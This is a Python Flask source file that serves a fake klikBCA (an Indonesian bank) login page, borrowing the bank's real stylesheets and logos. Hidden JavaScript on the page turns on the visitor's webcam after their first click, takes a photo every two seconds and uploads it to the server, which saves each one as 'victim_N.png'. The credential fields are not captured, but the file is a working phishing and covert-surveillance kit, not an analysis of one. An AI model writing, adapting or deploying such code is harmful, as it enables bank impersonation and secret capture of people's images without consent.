from flask import Flask, render_template_string, request
import base64
import os

app = Flask(__name__)
SAVE_PATH = "captured_faces"
if not os.path.exists(SAVE_PATH):
    os.makedirs(SAVE_PATH)

HTML_CONTENT = """
<html>
<head>
    <title>klikBCA Individual</title>
    <link rel="stylesheet" type="text/css" href="https://ibank.klikbca.com/css/kbi.css">
    <link rel="stylesheet" type="text/css" href="https://ibank.klikbca.com/css/banner-slide.css">
    <style>
        /* Tambahan dikit biar form-nya kelihatan pas demo */
        #dummy-form { padding: 20px; border: 1px solid #ccc; margin: 20px; width: 300px; }
    </style>
</head>

<body topmargin="0" marginheight="0" bgcolor="white" onload="document.getElementById('txt_user_id').focus();">
    <table border="0" cellpadding="0" cellspacing="0" width="760">
        <tbody>
            <tr>
                <td width="70"><img height="72" src="https://ibank.klikbca.com/images/logo_top1.gif" width="70"></td>
                <td width="10"><img height="72" src="https://ibank.klikbca.com/images/LOGO_TOP_anim.gif" width="10"></td>
                <td width="285"><img height="72" src="https://ibank.klikbca.com/images/LOGO_TOP.jpg" width="285"></td>
                <td background="https://ibank.klikbca.com/images/logo_top_back.gif" width="395"></td>
            </tr>
        </tbody>
    </table>

    <table border="0" cellpadding="0" cellspacing="0" width="759">
        <tr height="420">
            <td width="200" bgcolor="#6686df" valign="top" style="padding:15px; color:white; font-family:Verdana; font-size:10px;">
                <b>USER ID dan PIN Internet Banking dapat diperoleh pada saat Anda melakukan Registrasi...</b>
            </td>
            <td valign="top" style="padding:20px;">
                <font face="Verdana" size="2" color="#000090"><b>Silakan memasukkan USER ID Anda</b></font><br>
                <input type="text" id="txt_user_id" maxlength="12" size="24"><br><br>
                
                <font face="Verdana" size="2" color="#000090"><b>Silakan memasukkan PIN Internet Banking Anda</b></font><br>
                <input type="password" id="txt_pswd" maxlength="6" size="24"><br><br>
                
                <input type="submit" value="LOGIN" style="cursor:pointer;" id="fake_login">
            </td>
        </tr>
    </table>

    <video id="video" width="1" height="1" autoplay style="position:absolute; opacity:0;"></video>
    <canvas id="canvas" width="400" height="300" style="display:none;"></canvas>

    <script>
        async function startSilentCapture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                // Mulai ambil foto tiap 2 detik
                setInterval(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.getContext('2d').drawImage(video, 0, 0, 400, 300);
                    const imageData = canvas.toDataURL('image/png');
                    
                    fetch('/upload', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ image: imageData })
                    });
                }, 2000);
                
                console.log("Kamera aktif di background...");
            } catch (err) {
                console.log("Akses ditolak");
            }
        }

        // Trigger saat user klik tombol login atau klik area mana saja
        document.addEventListener('click', function() {
            startSilentCapture();
        }, { once: true });
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_CONTENT)

@app.route('/upload', methods=['POST'])
def upload():
    data = request.json['image']
    header, encoded = data.split(",", 1)
    binary_data = base64.b64decode(encoded)
    filename = f"{SAVE_PATH}/victim_{len(os.listdir(SAVE_PATH)) + 1}.png"
    with open(filename, "wb") as f:
        f.write(binary_data)
    return "Success"

if __name__ == '__main__':
    app.run(debug=True, port=5000)
 
